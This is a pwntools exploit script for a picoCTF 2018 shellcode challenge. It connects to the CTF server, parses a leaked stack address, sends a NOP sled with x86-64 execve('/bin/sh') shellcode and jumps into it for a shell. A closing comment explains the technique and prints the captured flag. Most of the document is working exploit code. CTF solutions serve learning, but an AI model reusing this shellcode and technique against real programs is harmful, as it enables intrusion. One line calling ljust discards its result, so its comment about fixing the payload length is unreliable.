from pwn import *
import struct

def pack(x):
    return hex(x)[2:].decode("hex")[::-1]

# p = process("./a.out")
p = remote("2018shell3.picoctf.com", 58896)
# gdb.attach(p)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print(p.recvuntil("Current position: "))

position = p.recvline().strip()
print(position)
position = int(position[position.find("0x")+2:], 16)
print(p.recvuntil("> "))

nops = (0x1000 - len(shellcode))
payload = "\x90" * (nops // 2)
payload += shellcode
payload.ljust(0x1000, "\x90") # Ensure that our payload is exactly 0x1000 characters
p.sendline(payload)

print(p.recvuntil("> "))
new_address = position + 1000
print("Jumping to: 0x%x" % new_address)
p.sendline(hex(new_address))
p.interactive()

"""
This is another shellcode problem, but the twist here is that we're given a random address somewhere
on the stack. Since we can't really jump to the exact address where our shellcode starts, we need to use
a NOP sled (a bunch of no-op instructions) to get there. Since NOPs don't have any side effects, we can safely
use append them to the start and end of our shellcode, then pray that the location we jump to is
somewhere in the sled.

$ ls
flag.txt
gps
gps.c
xinet_startup.sh
$ cat flag.txt
picoCTF{s4v3_y0urs3lf_w1th_a_sl3d_0f_n0ps_alhujefk}
"""
